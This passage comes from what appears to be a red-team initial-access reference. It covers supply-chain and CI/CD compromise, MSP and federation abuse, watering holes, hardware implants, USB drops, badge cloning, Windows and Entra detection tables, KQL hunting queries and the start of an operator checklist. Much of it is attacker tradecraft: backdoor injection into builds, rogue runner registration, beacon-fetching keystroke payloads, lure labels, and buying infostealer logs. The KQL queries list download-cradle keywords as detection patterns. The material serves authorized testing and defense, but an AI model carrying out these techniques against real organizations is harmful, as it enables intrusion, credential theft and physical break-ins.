  - Many enterprise consumers had not pinned action versions to commit
    SHAs (common bad practice using @v1, @v2, @main tags)

OPERATOR LESSON (defenders):
  - Pin GitHub Actions to specific commit SHA, not tag:
    uses: tj-actions/changed-files@<full-40-char-sha>
  - Limit GitHub Secrets exposure scope (per-job, per-step where possible)
  - Use OIDC federation instead of long-lived secrets where possible
  - GitHub Actions provenance (sigstore-based) attestation
  - Workflow approval gates for first-time-contributor PRs

OPERATOR LESSON (attackers — emerging pattern Q2 2025+):
  - GitHub Action compromise is a fast-moving supply chain attack
    pattern; weeks-to-months timeline vs years for OSS source compromise
  - Maintainer PAT theft is the typical vector (phishing, infostealer
    log of maintainer's machine, stolen browser cookies)
  - Multi-repo cascade (one PAT controls multiple action repos) amplifies
    blast radius
  - Defender adoption of pinned-SHA usage + OIDC federation will reduce
    impact over 2026-2027

RELATED CI/CD INCIDENTS:
  - reviewdog/action-* family (concurrent compromise March 2025)
  - PyPI / npm package author compromises (recurring pattern; ledger
    crypto wallet compromise Dec 2024 affecting 6 npm packages)
  - GitHub Actions self-hosted runner abuse (long-standing risk;
    persistent runners with broad permissions = supply-chain implant
    delivery vector)
```

### 8.5 — Other 2024-2025 Supply Chain Incidents (Operator Awareness)

```
═══════════════════════════════════════════════════════════
OTHER NOTABLE 2024-2025 SUPPLY CHAIN INCIDENTS
═══════════════════════════════════════════════════════════

CYBERHAVEN CHROME EXTENSION (December 2024):
  - Compromise of legitimate Chrome extension via maintainer account
    takeover
  - Attacker pushed malicious update with credential-theft logic
  - 400k+ orgs using Cyberhaven Data Loss Prevention extension
  - Vector: phishing of extension developer's Google account
  - Detection: Chrome Web Store flagged anomalous extension behavior
    within 48 hours; emergency removal
  - Operator lesson: browser extension supply chain is under-monitored
    relative to OSS package supply chain

PHANTOM WALLET / SOLANA WEB3.JS (December 2024):
  - Multiple npm packages in @solana/web3.js family compromised
  - Crypto-wallet credential theft injected into widely-used wallet SDK
  - Attribution: financially-motivated; targeted crypto-trading
    communities

LEDGER ECOSYSTEM (December 2024):
  - 6 npm packages in Ledger crypto wallet ecosystem compromised
  - Wallet seed-phrase exfiltration injected
  - Lateral compromise via shared maintainer credentials

PYPI ULTRALYTICS (December 2024):
  - Ultralytics YOLO library compromise via PyPI typosquatting +
    legitimate package version manipulation
  - Crypto-mining payload injected
  - Affected ML/CV development teams

LOTTIE PLAYER JS (October 2024):
  - JS animation library compromised; crypto-stealer injected
  - Affected websites embedding LottieFiles player

BROWSER EXTENSION CASCADE (multiple late 2024):
  - Cyberhaven, plus several smaller extensions compromised in cascade
  - Pattern: attacker compromised one extension developer; pivoted to
    others via password reuse / saved sessions

3CX (March 2023, ongoing relevance):
  - Lazarus Group — trojanized desktop client
  - Chained through earlier X_TRADER supply chain compromise
  - Multi-platform (Windows + macOS) malware deployment
  - Defender response: 3CX Pipeline Protection feature added; SBOM
    monitoring for vendor desktop apps gained adoption

SOLARWINDS RIPPLE (continuing through 2024):
  - Original APT29 SUNBURST 2020 still surfacing in incident reports
    as customers discover persistence remained dormant
  - 5+ year footholds documented

OPERATOR PATTERN OBSERVATIONS 2024-2025:
  - Browser extension compromise rising as vector (4-6 documented in
    Dec 2024 alone)
  - GitHub Actions / CI/CD attack window rapidly closing as defenders
    adopt pinned-SHA practices
  - Crypto ecosystem disproportionately targeted (financially motivated)
  - Single-maintainer projects remain highest-risk (XZ pattern repeats
    in different ecosystems)
```

### 8.6 — CI/CD Pipeline Compromise Patterns

```
═══════════════════════════════════════════════════════════
CI/CD PIPELINE COMPROMISE — POST-FOOTHOLD INTO BUILD ARTIFACT
═══════════════════════════════════════════════════════════

If you gain access to target's CI/CD (Jenkins, GitHub Actions, GitLab
CI, TeamCity — note CVE-2024-27198 mass exploitation and CVE-2024-23897
in §5): modify build pipeline → inject backdoor into software artifacts
→ backdoor deployed to production through normal release process.

GITHUB ACTIONS SELF-HOSTED RUNNERS:
  - Self-hosted runners with broad permissions = particularly common
    vector
  - Persistent runner = supply-chain-style implant delivery for any
    workflow that uses it
  - Discovery: enumerate org/repo runners via GitHub API (with creds)
  - Abuse pattern: register attacker-controlled self-hosted runner →
    workflows that match runner labels execute on attacker infra →
    secrets / artifacts flow through attacker

CI/CD-SPECIFIC ATTACK PATTERNS:
  - Build-time secret extraction (env-var dump in build log;
    cross-ref §8.4 tj-actions pattern)
  - Pre-commit hook abuse (modifies developer's local environment)
  - Pull request workflow abuse (workflows triggered on PR-from-fork
    can run with elevated context if misconfigured)
  - Branch protection bypass via Actions perms (workflow can push to
    protected branch if granted contents:write)
  - Workflow run permissions manipulation (modify workflow to grant
    excessive permissions to subsequent runs)

BUILD-PROVENANCE COUNTERMEASURES (defender awareness):
  - SLSA Level 3+ provenance requirements
  - sigstore / cosign for artifact signing + verification
  - in-toto for end-to-end build attestation
  - Reproducible builds — independent rebuild verification
```

### 8.7 — Trusted Relationship (T1199)

```
═══════════════════════════════════════════════════════════
TRUSTED RELATIONSHIP — MSP / FEDERATION / GDAP / TELECOM
MITRE ATT&CK: T1199 (Trusted Relationship), T1078 (Valid Accounts)
STEALTH: VERY HIGH (legitimate trusted source)
SUCCESS: MEDIUM (high blast radius when successful)
SKILL: MEDIUM
═══════════════════════════════════════════════════════════

CATEGORIES:

  A) MSP / IT PROVIDER COMPROMISE → pivot to all their clients
  B) PARTNER VPN / SITE-TO-SITE CONNECTION ABUSE
  C) FEDERATED IDENTITY (SAML/OIDC trust between organizations)
  D) VENDOR WITH PRIVILEGED ACCESS TO TARGET ENVIRONMENT

HISTORICAL EXAMPLES:
  - Kaseya (REvil, 2021) — MSP management tool → 1500+ orgs via single
    supply-chain-style exploitation of the VSA agent
  - Microsoft cloud partner compromise (Nobelium / APT29, 2023) —
    abuse of Microsoft Partner Center delegated access privileges
  - SolarWinds (APT29, 2020) — simultaneously supply chain AND trusted
    relationship; customers trusted the Orion update process

CURRENT PATTERN: Scattered Spider / UNC3944 MSP TARGETING (2024-2025):
  - Per ReliaQuest and Mandiant reporting, Scattered Spider shifted
    from direct enterprise targeting to MSP and IT contractor
    compromise as access multiplier
  - One MSP tenant compromised → "one-to-many" access into dozens of
    client networks
  - Primary technique: same help desk vishing pattern (§2.3) targeted
    at the MSP's own help desk rather than end client's
  - Observed in healthcare MSP compromises (HIPAA Journal June 2025)
    and IT-contractor-to-UK-retail pivot chain (M&S / Co-op / Harrods
    April-May 2025 incidents traced to TCS contractor credentials)
  - The UK retail wave specifically abused compromised IT-contractor
    accounts with domain-joined workstation access at the target

CLOUD FEDERATION ABUSE:
  - Cross-tenant federation (Entra ID B2B trust) when attacker controls
    one side
  - Entra ID cross-tenant sync (introduced 2022) to push identities
    across tenant boundaries
  - Delegated admin privileges (GDAP / DAP in Microsoft Partner Center)
    — compromise of a partner tenant grants access to all downstream
    customer tenants where DAP is still active

SALT TYPHOON TELECOM CONTEXT (2024-2026):
  Source: https://www.congress.gov/crs-product/IF12798
  - Salt Typhoon (PRC) compromised 9+ US telcos including Verizon, AT&T,
    T-Mobile, Spectrum
  - Lawful intercept (CALEA) systems accessed
  - OPERATOR IMPLICATION: telecom-routed authentication paths considered
    compromised in 2026 — SMS MFA, voice OTP, callback verification
    flows are MITM-able by state actor with telecom access
  - Defender response: phishing-resistant MFA (FIDO2 / certificate)
    mandate growing across regulated industries
  - Joint advisory CISA + NSA + FBI + AU/NZ/CA Dec 2024: comms-sector
    hardening guidance

OT / HARDWARE SUPPLY CHAIN (for completeness):
  - Firmware compromise during manufacturing (Supermicro BMC allegations
    2018, CosmicStrand UEFI 2022)
  - Pre-installed malware on shipped hardware (ShadowHammer / ASUS Live
    Update 2019)
  - Not command-line exploitable — extended supply chain threat modeling
    territory

DETECTION:
  - Unusual access from partner IP ranges
  - Federated auth anomalies (cross-tenant token issuance patterns)
  - GDAP / DAP usage audits
  - Cross-tenant sync log review
  - MSP-originated RMM tool execution (ScreenConnect, ConnectWise,
    N-able, Kaseya VSA) on sensitive hosts

OPSEC: Very high stealth — access from trusted source with legitimate
  credentials. Help-desk-to-MSP pivot is current highest-leverage
  variant for financially-motivated groups.
```

### 8.8 — Watering Hole

```
═══════════════════════════════════════════════════════════
WATERING HOLE (T1189)
MITRE ATT&CK: T1189 (Drive-by Compromise)
STEALTH: HIGH (when selective targeting is used)
SUCCESS: LOW (per-target; pre-screened victim filtering)
SKILL: HIGH
═══════════════════════════════════════════════════════════

WORKFLOW:
  - Identify websites frequented by target employees (industry sites,
    forums, news, vendor docs)
  - Compromise those websites → inject exploit code / malicious redirect
  - SELECTIVE TARGETING: only serve exploit to visitors from target IP
    ranges (AS lookup at server side); appears benign to all other
    traffic
  - Browser exploitation: typically requires 0-day (very high cost)
  - Alternative: inject credential harvesting instead of exploit

OBSERVED 2024-2025 PATTERNS:
  - APT41 watering hole campaigns targeting tech / energy industry
    sites
  - North Korean Lazarus / Diamond Sleet using watering holes against
    crypto-developer communities
  - Selective serving via cookie / header / referrer-based filtering

DETECTION:
  - Website integrity monitoring (file-system watchers; periodic content
    diff)
  - Browser exploit detection (modern browsers + EDR catch most known
    exploits)
  - DNS / proxy logs: outbound to known watering-hole-compromised
    domains (depends on threat intel feed quality)
  - Selective-targeting evasion makes defender labs' analysis difficult
    — testing from non-target IP returns benign content

OPSEC: HIGH stealth if selective targeting used (only target IP ranges
  served exploit). Per-target effort high; primarily useful for
  high-value or geographically-clustered targets.
```

```
═══════════════════════════════════════════════════════════
SECTION 8 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §03 Initial Access (latent supply chain payload activates as IA)
Enables → §04 Persistence (supply chain backdoor IS the persistence)
Enables → §07 Defense Evasion (legitimate signed code bypasses inspection)
Cross-ref → §3.7 browser extension installation = §8.5 extension supply
            chain compromise
Cross-ref → §8.7 GDAP / federation = §7 cloud cross-tenant access policy
Cross-ref → §1.1 subdomain takeover = §7.8 cloud DNS dangling = §8.3
            CDN-delivery-path compromise (all delivery-path manipulation)
NEVER → Compromise OSS project without engagement RoE explicitly
        authorizing third-party-system targeting
```

---

## 9 — PHYSICAL ACCESS & HARDWARE IMPLANTS

> **Typical chains through this section:** Engagement physical scope authorized → reconnaissance of physical premises (cross-ref passive recon §11) → ingress via tailgating / badge clone / social engineering → device implant deployment (network or USB) → callback C2. Physical implants persist across software hardening; valuable for high-value or air-gapped targets.

### 9.1 — Network Implant Deployment

```
═══════════════════════════════════════════════════════════
NETWORK IMPLANT DEPLOYMENT (T1200 — Hardware Additions)
MITRE ATT&CK: T1200 (Hardware Additions)
STEALTH: HIGH (physical concealment); LOW once implant active
SUCCESS: HIGH (if undetected)
SKILL: MEDIUM
═══════════════════════════════════════════════════════════

RASPBERRY PI / SIMILAR SBC:
  - Pre-configure with: reverse SSH tunnel, C2 agent, optional WiFi AP
  - Connect to open network port (conference room, printer port, under
    desk, server-room patch panel)
  - Device auto-connects back to attacker C2 via HTTPS or DNS

HAK5 DEVICES (commercial implants):
  - LAN Turtle: Inline USB Ethernet implant (stealth, passive)
  - Packet Squirrel: Inline network tap (capture + exfil)
  - Shark Jack: Quick network recon (plug in, scan, pull out)
  - WiFi Pineapple: Rogue AP for wireless attacks

STEALTH CONFIGURATION:
  - Match physical labels of legitimate IT equipment
  - Match cabling color + length to environment
  - Place in low-foot-traffic location (behind printers, under desks,
    above ceiling tiles)
  - Power: PoE-injector OR plug into existing power strip

DETECTION:
  - Network device inventory (NAC — Forescout, ClearPass, Cisco ISE)
  - Unexpected DHCP leases
  - Rogue device scan / 802.1X enforcement
  - MAC OUI anomaly (unfamiliar device manufacturer)
  - Unauthorized DNS callbacks from unmanaged device

OPSEC: Physical proximity required; high physical-detection risk.
  Engagement RoE must explicitly authorize physical placement.
```

### 9.2 — USB Attacks (T1091 + T1200)

```
═══════════════════════════════════════════════════════════
USB-BASED ATTACKS
MITRE ATT&CK: T1091 (Replication Through Removable Media), T1200
STEALTH: VARIES (drop-and-walk vs targeted)
SUCCESS: LOW (per-drop) to HIGH (single-target)
SKILL: LOW (Rubber Ducky) to HIGH (custom O.MG)
═══════════════════════════════════════════════════════════

HAK5 RUBBER DUCKY:
  - Keystroke injection device (appears as HID keyboard to OS)
  - Payload: opens PowerShell, downloads + executes beacon in <5 seconds
  - Detection: USB PnP event 6416; rapid keystroke injection EDR rule

O.MG CABLE:
  - USB cable with embedded implant — indistinguishable from normal
    cable
  - Triggers via WiFi remote command from operator
  - Higher cost; harder to detect

HAK5 BASH BUNNY:
  - Multi-vector USB attack platform (HID + storage + network)
  - Multiple payload types (keystroke, exfil, network attack)

USB DROP CAMPAIGN:
  - Leave Rubber Ducky / weaponized USB in parking lot, lobby, mailroom
  - Label: "Salary Review Q4" or "Confidential - HR" to maximize click rate
  - Conversion rate: documented studies show 30-50% of dropped USBs are
    plugged in by employees

USB-C POWER DELIVERY (PD) ABUSE (2024 BadUSB-PD research):
  - Modern USB-C with Power Delivery negotiation includes data channel
    negotiation
  - Malicious PD device can negotiate higher-than-expected privilege
    via PD protocol manipulation
  - Niche; primarily relevant for organizations with USB-C deployment
  - Detection: limited; emerging research area

DETECTION:
  - USB PnP events (Security Event ID 6416 — Audit PnP Activity)
  - Device-control policies (block unknown HID, block unknown storage)
  - EDR: HID device enumeration + rapid keystroke injection detection
  - Group Policy: disable AutoRun (long-standing default)

OPSEC: USB attacks require physical proximity → high physical-detection
  risk. Drop campaigns spread risk across multiple targets but reduce
  per-victim success rate.
```

### 9.3 — Badge Cloning & Physical Entry

```
═══════════════════════════════════════════════════════════
BADGE CLONING & PHYSICAL ENTRY
MITRE ATT&CK: T1200 (Hardware Additions — adjacent)
STEALTH: VARIES (depends on badge protocol + reader proximity)
═══════════════════════════════════════════════════════════

BADGE READER + CLONE TOOLKIT:
  - PROXMARK3: Read HID/iClass/MIFARE badges → clone to T5577 or magic
    card (long-standing operator standard)
  - LONG-RANGE HID READER: capture badge data at 2-3 feet distance
  - FLIPPER ZERO: multi-protocol reader (RFID, NFC, sub-GHz, IR)

BADGE PROTOCOL ENCRYPTION (operator awareness):
  - HID Prox (125kHz): NO encryption — trivially clonable
  - HID iClass (legacy): proprietary "Standard" mode broken; iClass SE
    + SR with elite key are stronger but sometimes implemented poorly
  - MIFARE Classic: broken (Crypto-1 cipher); clonable
  - MIFARE DESFire EV1/EV2/EV3: AES-based, harder to clone but possible
    with reader compromise
  - HID iClass SEOS: modern; AES-128 mutual auth; clone requires reader
    compromise or key extraction
  - Bluetooth LE / NFC mobile credential (HID Mobile Access, Apple
    Wallet ID): credential stays on phone with biometric unlock

ALTERNATIVE PHYSICAL ENTRY:
  - TAILGATING: follow employee through secured door (highest success
    against unattentive employees)
  - SOCIAL ENGINEERING: "forgot badge", delivery pretext, maintenance
    worker, contractor pretext (matching observed behavior of legitimate
    contractors)
  - LOCK BYPASS: shims (cylinder shim), bump keys, electric picks,
    under-door tools (shrink-wrap reach-through)

DETECTION:
  - Badge access logs (anomalous access patterns: weekend access by
    non-weekend-pattern user, double-swipe with same badge ID at
    different physical locations within minutes)
  - Security cameras + visitor logs
  - Anti-tailgating mantraps (single-person entry vestibules)
  - Anti-passback policy (one badge can't enter same area twice
    consecutively)

OPSEC: Dress code matters — match the environment (business casual,
  uniform, contractor uniform with branded shirt). Physical OPSEC
  errors (wrong badge orientation, wrong color clothing for office
  norm) can be the difference between successful entry and security
  intervention.
```

```
═══════════════════════════════════════════════════════════
SECTION 9 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §03 Initial Access (physical foothold = network foothold)
Enables → §04 Persistence (hardware implant = persistent backdoor)
Cross-ref → Wireless cheatsheet for post-implant WiFi attacks
Cross-ref → Passive recon §11 for physical-recon preparation
NEVER → Physical operations without explicit engagement RoE; physical
        operations have legal exposure beyond cyber engagement scope
        (trespass, theft of services, criminal mischief jurisdictional
        variations)
```

---

## 10 — OPSEC & DETECTION REFERENCE

```
═══════════════════════════════════════════════════════════
INITIAL ACCESS DETECTION SIGNATURES (extended 2026 baseline)
═══════════════════════════════════════════════════════════
TECHNIQUE              │ KEY DETECTIONS                     │ LOGS/TELEMETRY
───────────────────────┼────────────────────────────────────┼─────────────────────
AiTM phishing          │ New device sign-in, atypical travel│ Entra ID sign-in, CA
                       │ Unmanaged device token replay      │ Defender XDR AiTM alert
Device code phishing   │ Device code auth method logged     │ Entra ID sign-in logs
                       │                                    │ + Auth Flows policy log
OAuth consent phish    │ Consent grant event, new app       │ Entra ID audit, UAL
                       │ Sensitive scope grant              │ MDCA OAuth alerts
Help desk vishing      │ MFA reset → new-device sign-in     │ Entra audit + SigninLogs
                       │ Anomalous MFA enrollment source IP │ Correlated w/ IT ticket
Teams external chat    │ External user added, Teams chat    │ Teams admin audit logs
                       │ from unfamiliar tenant             │ Defender for O365 Teams
ClickFix / paste-run   │ explorer.exe → powershell.exe      │ Sysmon EID 1, EDR behav.
                       │ with IEX / http cradle             │ MDE clipboard rule
Password spray         │ Bulk 4771/failed logins, lockouts  │ DC security log, Entra
                       │                                    │ Identity Protection
Infostealer creds      │ Login from unseen ASN, impossible  │ Entra IdP risk + UAL
                       │ travel, immediate bulk data access │ Defender for Cloud Apps
Cookie replay          │ Same user, new browser fingerprint │ Entra sign-in + token
                       │ same session token                 │ issuer anomaly
SaaS-to-SaaS pivot     │ OAuth grant chains across SaaS     │ MDCA + per-SaaS audit
                       │ correlated via SIEM                │ Defender XDR (Q1 2026+)
Edge device exploit    │ Appliance crash/restart, new admin │ Appliance syslog, SIEM
Web app exploit        │ WAF alerts, error spikes, webshell │ WAF, access logs, FIM
RDP brute force        │ Event 4625 (type 10) in bulk       │ Security log, NLA logs
                       │ MDI brute-force-attack RDP alert   │ MDI alerts
VPN with stolen creds  │ Unusual VPN location/device        │ VPN auth logs, RADIUS
Spearphish payload     │ Email gateway alerts, sandbox det. │ Email gateway, EDR
HTML smuggling         │ JS assembly patterns in email      │ Email gateway (advanced)
SVG smuggling          │ SVG attachment with script tags    │ Email gateway (improving)
search-ms abuse        │ explorer.exe → powershell with     │ Sysmon EID 1
                       │ WebDAV path                        │
MSIX abuse             │ AppInstaller.exe with network args │ Sysmon EID 1, MDE rule
Browser extension      │ Unmanaged extension install event  │ Chrome Enterprise Reporting
USB/physical implant   │ New HID device, DHCP lease         │ Security 6416, NAC, DHCP
Supply chain           │ Hash mismatch in signed software   │ SBOM, build provenance
                       │ Dependency version deviation       │ SCA tools, repo audit
Remote-tool implant    │ ScreenConnect/AnyDesk install by   │ Defender XDR remote-tool
                       │ non-IT user                        │ alert (Q4 2024+)
Subdomain takeover     │ Dangling DNS / unexpected resource │ DNS audit, CSPM
                       │ on subdomain                       │ subdomain takeover monitor
SCIM API abuse         │ User created via SCIM (not IdP)    │ SaaS audit log + SIEM
                       │                                    │ correlation
Watering hole          │ Browser exploit detection, IDS     │ Proxy, IDS/IPS, EDR
```

```
═══════════════════════════════════════════════════════════
DEFENDER STACK REFERENCE — WHAT EACH PRODUCT SEES (parallel to active recon §9)
═══════════════════════════════════════════════════════════
ENDPOINT (host telemetry):
  Microsoft Defender for Endpoint (MDE)
    Sees: Process tree, file-system events, network connections, registry,
          ETW Threat Intelligence (kernel), AMSI inspection, ASR rule
          enforcement
    Misses: Identity-plane events (handled by MDI); cross-host correlation
          (XDR layer)
  CrowdStrike Falcon, SentinelOne, Cybereason, Carbon Black
    Same primitives; vendor-specific behavioral models

IDENTITY (DC + Entra signals):
  Microsoft Defender for Identity (MDI)
    Sees: ALL DC traffic (Kerberos, LDAP, NTLM, SAMR, DCSync, DCShadow,
          replication); 30+ named attack patterns
    Specific high-fidelity alerts:
      - Suspected user enumeration
      - Suspected AS-REP Roasting
      - Suspected Kerberos SPN exposure (Kerberoasting)
      - Suspected DCSync attack
      - Suspected DCShadow attack
      - Suspected Golden Ticket usage
      - Suspected pass-the-hash / pass-the-ticket
      - Suspected NTLM relay attack
      - Reconnaissance using directory services queries
      - Honeytoken account login attempt
  Entra Sign-in Logs + Identity Protection
    Sees: All authentication attempts (success + failure), risk scoring,
          atypical-sign-in detection (impossible travel, anonymous IP,
          atypical location, malware-linked IP)

CLOUD (SaaS + cloud-side):
  Defender for Cloud Apps (MDCA / formerly MCAS)
    Sees: SaaS sessions (M365, Salesforce, etc.), session-level anomaly,
          OAuth app-grant events, shadow-IT detection
    Q1 2026 new alert: "Suspicious OAuth app activity" for SaaS-to-SaaS
    pivot detection
  AWS GuardDuty / Detective
    Sees: Malicious IP communication, unusual API patterns, port scanning
          from EC2, suspicious DNS queries
  Wiz / Lacework / Orca (CSPM)
    Sees: Cloud config drift, exposed assets, IAM over-permissioning,
          attack-path graph reconstruction

EMAIL (perimeter + SaaS):
  Defender for Office 365 Plan 2
    Sees: All inbound email; Safe Links URL reputation; Safe Attachments
          sandbox detonation; ATP anti-phish behavioral
    Teams Plan 2: extends Safe Links + Safe Attachments to Teams
  Proofpoint / Mimecast / Abnormal Security
    Same primitives; Abnormal specifically uses behavioral inbox model

NETWORK (enterprise):
  NDR (Vectra / Darktrace / ExtraHop Reveal(x))
    Sees: East-west scan + lateral movement, C2 beaconing, exfil patterns
  Stealthwatch / Plixer Scrutinizer
    Sees: Flow-volume anomalies, new-flow detection
  WAF (Cloudflare / Akamai / etc.)
    Sees: HTTP probe patterns, scanner User-Agents, rate-limit triggers

XDR CORRELATION:
  Defender XDR / CrowdStrike XDR / SentinelOne Singularity
  Chains: scan → failed-auth → identity event → endpoint anomaly →
  cross-tenant access → automated containment within minutes.
  This is the real defender capability. Single events benign;
  chains alert.
```

```
═══════════════════════════════════════════════════════════
ENTRA ID / O365 CRITICAL EVENTS (audit log mapping)
═══════════════════════════════════════════════════════════
  UserLoggedIn                  All sign-ins (check auth method)
  Device code sign-in           Visible in Entra sign-in logs
                                (auth method = "Device code")
  Consent to application        OAuth app consent grant
  Add service principal         New app registered
  Add credential to app         Suspicious SP credential addition
  Update user authentication    MFA reset / method change (KEY help-desk
                                vishing indicator)
  New-InboxRule                 Email forwarding rule (post-compromise)
  MailItemsAccessed             Mailbox content read (E5/explicit)
  Set-Mailbox -ForwardingAddress External mail forwarding (BEC pattern)
  Add member to role            Role assignment (privilege escalation)
  Add eligible role assignment  PIM role grant
  Activate role (PIM)           PIM elevation request
  Connector created             Power Automate / Logic Apps connector
                                creation (post-foothold persistence)
  External user added           Teams external collaboration (Teams
                                external chat phishing setup)
```

```
═══════════════════════════════════════════════════════════
WINDOWS ENDPOINT EVENTS (initial access focus)
═══════════════════════════════════════════════════════════
  4624    Logon (type 2=interactive, 3=network, 10=RDP)
  4625    Failed logon (brute force detection)
  4648    Explicit credential logon
  4771    Kerberos pre-auth failed (spray detection)
  4740    Account lockout (spray boundary)
  6416    New external device recognized (Audit PnP Activity)
  4663    Object access (file read after webshell)
  1102    Audit log cleared (post-compromise indicator)
  1     (Sysmon) Process create — primary EDR primitive
  3     (Sysmon) Network connection
  7     (Sysmon) Image load (DLL sideloading detection)
  11    (Sysmon) File create (payload drop detection)
  22    (Sysmon) DNS query (C2 beacon detection)
```

### 10.6 — KQL Hunting Queries (extended for 2026 techniques)

```kql
// Help desk vishing — MFA method reset followed by sign-in from new device
AuditLogs
| where OperationName in ("Update user", "Reset user password",
                          "Admin registered security info for user")
| where Result == "success"
| project ResetTime=TimeGenerated, TargetUser=TargetResources[0].userPrincipalName,
          ResetInitiator=InitiatedBy.user.userPrincipalName
| join kind=inner (SigninLogs
    | where TimeGenerated > ago(2h)
    | where ResultType == 0
    | project SignInTime=TimeGenerated, UserPrincipalName, IPAddress,
              DeviceDetail=tostring(DeviceDetail), RiskState)
    on $left.TargetUser == $right.UserPrincipalName
| where SignInTime between (ResetTime .. (ResetTime + 4h))
| where RiskState != "none" or DeviceDetail has "Unknown"
| project ResetTime, TargetUser, ResetInitiator, SignInTime, IPAddress,
          DeviceDetail, RiskState
```

```kql
// AiTM token replay detection — sign-in with known user but new device + IP
SigninLogs
| where ResultType == 0
| summarize last_seen=max(TimeGenerated), distinct_ips=dcount(IPAddress),
            distinct_devices=dcount(tostring(DeviceDetail.deviceId))
            by UserPrincipalName, bin(TimeGenerated, 1h)
| where distinct_ips > 2 and distinct_devices > 1
```

```kql
// Device code phishing — sign-ins using device code authentication method
SigninLogs
| where AuthenticationProtocol == "deviceCode"
| extend AppDisplay=tostring(AppDisplayName)
| where AppDisplay !in (well_known_device_code_apps)
| summarize count() by UserPrincipalName, AppDisplay, IPAddress, bin(TimeGenerated, 1h)
```

```kql
// OAuth consent — new consent grants with sensitive scopes
AuditLogs
| where OperationName == "Consent to application"
| extend Scopes=tostring(TargetResources[0].modifiedProperties)
| where Scopes has_any ("Mail.Read", "Mail.Send", "Files.ReadWrite",
                        "User.Read.All", "Directory.Read.All",
                        "offline_access")
| project TimeGenerated, User=InitiatedBy.user.userPrincipalName,
          AppId=TargetResources[0].id, AppName=TargetResources[0].displayName, Scopes
```

```kql
// ClickFix — explorer.exe spawning powershell.exe with download cradle
DeviceProcessEvents
| where InitiatingProcessFileName =~ "explorer.exe"
| where FileName in~ ("powershell.exe", "mshta.exe", "cmd.exe")
| where ProcessCommandLine has_any ("IEX", "Invoke-WebRequest", "DownloadString",
                                    "FromBase64String", "-enc", "http://", "https://")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessCommandLine
```

```kql
// Infostealer cookie replay — sign-in from ASN never seen for this user
SigninLogs
| where ResultType == 0
| extend ASN=tostring(NetworkLocationDetails[0].isp)
| summarize first_seen=min(TimeGenerated), known_asns=make_set(ASN)
            by UserPrincipalName
| join kind=inner (SigninLogs | where TimeGenerated > ago(1d))
    on UserPrincipalName
| extend CurrentASN=tostring(NetworkLocationDetails[0].isp)
| where CurrentASN !in (known_asns)
| project TimeGenerated, UserPrincipalName, IPAddress, CurrentASN,
          UserAgent, RiskState
```

```kql
// SharePoint ToolShell exploitation (CVE-2025-49706/49704/53770)
// IIS access logs with specific URL pattern
W3CIISLog
| where csUriStem has_any ("/_api/web/", "/_layouts/15/")
| where csUriQuery has "ToolPane.aspx" or csMethod == "POST"
| where csUserAgent !in (known_legitimate_agents)
| where scStatus == 200
| project TimeGenerated, sIp, csUriStem, csUriQuery, csUserAgent, cIp
```

```kql
// AzureHound enumeration pattern (Storm-0501 / Void Blizzard)
AzureActivity
| where OperationNameValue has_any ("MICROSOFT.AUTHORIZATION/ROLEDEFINITIONS/READ",
                                    "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/READ")
| summarize count() by Caller, ResourceProvider, bin(TimeGenerated, 5m)
| where count_ > 100   // High-volume role enumeration
```

```kql
// Cross-tenant access policy abuse (Storm-0501 pattern)
AuditLogs
| where OperationName has_any ("Update cross-tenant access setting",
                                "Add identity provider")
| where Category in ("CrossTenantAccessSettings", "ApplicationManagement")
| project TimeGenerated, OperationName, Initiator=InitiatedBy.user.userPrincipalName,
          TargetResources, Result
```

```kql
// Remote-tool implant install (Scattered Spider pattern)
DeviceProcessEvents
| where FileName in~ ("ScreenConnect.ClientService.exe", "ScreenConnect.WindowsClient.exe",
                      "AnyDesk.exe", "TeamViewer_Service.exe", "TeamViewer.exe",
                      "Splashtop_Streamer.exe", "AteraAgent.exe", "QuickAssist.exe")
| where InitiatingProcessFileName !in (known_IT_install_processes)
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
```

```kql
// IngressNightmare exploitation (CVE-2025-1097 pattern)
// Kubernetes audit log
KubeAudit_CL
| where ResponseStatus_code_d in (200, 201)
| where verb_s in~ ("create", "update")
| where objectRef_resource_s == "ingresses"
| where objectRef_subresource_s == "" or isempty(objectRef_subresource_s)
| where requestObject_s has_any ("nginx.ingress.kubernetes.io/auth-snippet",
                                  "nginx.ingress.kubernetes.io/server-snippet",
                                  "nginx.ingress.kubernetes.io/configuration-snippet")
| project TimeGenerated, user_username_s, sourceIPs_s, objectRef_namespace_s,
          objectRef_name_s, verb_s
```

```kql
// SaaS-to-SaaS OAuth pivot detection
// Defender for Cloud Apps cross-app token usage pattern
CloudAppEvents
| where ActionType in ("OAuth grant created", "App consent granted")
| join kind=inner (CloudAppEvents
    | where ActionType has "Token issued" or ActionType has "API call"
    | where TimeGenerated > ago(1h))
    on AccountObjectId
| where Application1 != Application2  // cross-app token usage
| project TimeGenerated, AccountObjectId, Application1, Application2, ActionType
```

---

## 11 — OPERATIONAL CHECKLIST

```
═══════════════════════════════════════════════════════════
PRE-OPERATION
═══════════════════════════════════════════════════════════
□ OSINT complete: employees, emails, tech stack, external attack surface
□ Target mapping: external services, VPN vendor, email platform, cloud provider
□ Breach data checked: credentials from previous compromises of target /
  employees
□ Infostealer log market checked: filter for target's domain credentials,
  enterprise-licensed device segment, MFA-gap candidates
□ IAB market checked: any pre-listed access for target available?
□ Attack infrastructure ready:
  □ Aged domains (6+ months) with valid categorization
  □ TLS certificates (Let's Encrypt or purchased)
  □ SMTP infrastructure with SPF/DKIM/DMARC configured + IP warmed
  □ Redirector chain (cloud function → C2 server)
  □ AiTM proxy stack (if AiTM phishing planned)
  □ C2 configured with malleable profile
□ Payloads tested against current EDR/AV in lab
□ Phishing pretexts drafted, reviewed, tested (grammar, branding, timing)
□ Conditional Access policy enumeration via test-account probing
□ Auth Flows policy check (device code blocking) — verify before attempt
□ Authentication Strengths policy check — what MFA methods does target enforce
□ Token Protection / compliant-device CA policy check — informs which AiTM
  paths still work
□ Rules of engagement confirmed (in writing, signed by authorized stakeholder)

═══════════════════════════════════════════════════════════
ATTEMPT ORDER (APT methodology — quietest first; 2026 reality-weighted)
═══════════════════════════════════════════════════════════
1. INFOSTEALER LOG MARKETS: check for credentials matching target domain;
   filter for enterprise / unmanaged-device logs; test for no-MFA SaaS
